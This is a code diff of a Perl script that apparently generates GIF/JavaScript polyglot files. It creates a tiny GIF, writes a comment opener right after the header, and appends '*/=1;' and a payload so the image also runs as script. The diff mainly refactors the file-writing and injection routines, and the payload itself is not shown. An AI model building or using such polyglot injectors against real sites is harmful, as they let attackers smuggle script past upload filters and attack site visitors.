@@ -12,6 +12,7 @@ use strict;
 use warnings;
 use feature 'say';
 
+use POSIX;
 use Getopt::Long;
 use GD;
 
@@ -38,7 +39,6 @@ say <<EOF;
 EOF
 
 create_gif              unless -f $outfile;
-
 inject_payload;
 
 say `file       $outfile`   if -f '/usr/bin/file';
@@ -71,10 +71,9 @@ sub create_gif {
 
     $img->setPixel(0, 0, $color);
 
-    open my $fh, '>', $outfile or die;
-    binmode $fh;
-    print   $fh  $img->gif;
-    close   $fh;
+    sysopen my $fh, $outfile, O_CREAT|O_WRONLY;
+    syswrite   $fh, $img->gif;
+    close      $fh;
 
     say "[✔] File saved to: $outfile\n";
 }
@@ -82,11 +81,11 @@ sub create_gif {
 sub inject_payload {
     say "[>] Injecting payload into $outfile";
 
-    sysopen my $fh, $outfile, 1 or die;
-    sysseek    $fh, 6, 0;
+    sysopen my $fh, $outfile, O_WRONLY;
+    sysseek    $fh, 6, SEEK_SET;
 
     syswrite   $fh, "\x2f\x2a";
-    sysseek    $fh, 0, 2;
+    sysseek    $fh, 0, SEEK_END;
 
     syswrite   $fh, "\x2a\x2f\x3d\x31\x3b";
     syswrite   $fh, $payload;
